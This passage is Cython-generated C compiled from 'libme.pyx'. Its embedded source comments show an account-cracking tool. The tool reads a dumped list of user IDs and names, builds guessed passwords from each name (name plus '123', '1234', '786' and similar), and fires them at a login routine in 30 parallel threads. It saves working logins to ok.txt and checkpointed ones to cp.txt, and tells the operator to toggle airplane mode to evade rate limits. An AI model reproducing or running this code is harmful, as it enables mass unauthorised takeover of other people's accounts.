          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 523, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":522
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":501
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f2.txt'
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__Frr__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_myfile);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":537
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_35__menn__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_35__menn__ = {"__menn__", (PyCFunction)__pyx_pw_5libme_5James_35__menn__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_35__menn__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__menn__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_34__menn__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_34__menn__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_pastefile = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__menn__", 0);

  /* "libme.pyx":538
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":539
 * 	def __menn__(self):
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')             # <<<<<<<<<<<<<<
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__46, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 539, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_v_pastefile = __pyx_t_4;
      __pyx_t_4 = 0;

      /* "libme.pyx":540
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 540, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_pastefile);
      __Pyx_GIVEREF(__pyx_v_pastefile);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_pastefile);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 540, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 540, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 540, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 540, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 540, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 540, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 540, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 540, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 540, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 540, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":541
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_4, __pyx_t_6); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 541, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

        /* "libme.pyx":540
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 */
      }
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      /* "libme.pyx":538
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":542
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 */
    __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
    if (__pyx_t_12) {
      __Pyx_AddTraceback("libme.James.__menn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_6, &__pyx_t_4) < 0) __PYX_ERR(0, 542, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GOTREF(__pyx_t_4);

      /* "libme.pyx":543
 * 				self.id.append(line.strip())
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))             # <<<<<<<<<<<<<<
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 */
      if (unlikely(!__pyx_v_pastefile)) { __Pyx_RaiseUnboundLocalError("pastefile"); __PYX_ERR(0, 543, __pyx_L5_except_error) }
      __pyx_t_9 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Please_Dump_File_first_s_not_fo, __pyx_v_pastefile); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 543, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_CallOneArg(__pyx_builtin_exit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 543, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    /* "libme.pyx":538
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 * 			for line in open(pastefile, 'r').readlines():
 */
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  /* "libme.pyx":544
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 */
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 544, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 544, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 544, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_91m_s_0_97m_3, __pyx_t_4); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 544, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 544, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":545
 * 			exit("\n [!] Please Dump File first %s not found"%(pastefile))
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 545, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_v_ask = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":546
 * 		print("  [] Total id -> \033[0;91m%s\033[0;97m"%(len(self.id)))
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 */
  __pyx_t_13 = (__Pyx_PyString_Equals(__pyx_v_ask, __pyx_n_s_y, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 546, __pyx_L1_error)
  if (__pyx_t_13) {

    /* "libme.pyx":547
 * 		ask = input("  [?] Password method [y/t] : ")
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 */
    /*with:*/ {
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 547, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 547, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 547, __pyx_L1_error)
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_empty_tuple, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 547, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_3 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 547, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_5, __pyx_n_s_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 547, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 547, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __pyx_t_4;
      __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      /*try:*/ {
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_2, &__pyx_t_1, &__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_2);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_14);
          /*try:*/ {
            __pyx_v_coeg = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":548
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_Example_Separators_44) < 0) __PYX_ERR(0, 548, __pyx_L18_error)

            /* "libme.pyx":549
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
            __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 549, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_v_listpass = __pyx_t_6;
            __pyx_t_6 = 0;

            /* "libme.pyx":550
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            __pyx_t_7 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 550, __pyx_L18_error)
            __pyx_t_13 = ((__pyx_t_7 <= 5) != 0);
            if (__pyx_t_13) {

              /* "libme.pyx":551
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
              __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 551, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

              /* "libme.pyx":550
 * 				print("\n  \033[0;97m[*] For Example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
            }

            /* "libme.pyx":552
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
            __pyx_t_6 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 552, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 552, __pyx_L18_error)
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "libme.pyx":553
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 553, __pyx_L18_error)

            /* "libme.pyx":554
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 554, __pyx_L18_error)

            /* "libme.pyx":555
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					uid, name = user.split("|")
 */
            if (__Pyx_PrintOne(0, __pyx_kp_s_if_no_result_turn_on_airplane_m) < 0) __PYX_ERR(0, 555, __pyx_L18_error)

            /* "libme.pyx":556
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] if no result turn on airplane mode 5 seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 */
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 556, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_6);
            if (likely(PyList_CheckExact(__pyx_t_6)) || PyTuple_CheckExact(__pyx_t_6)) {
              __pyx_t_5 = __pyx_t_6; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
              __pyx_t_8 = NULL;
            } else {
              __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 556, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_5);
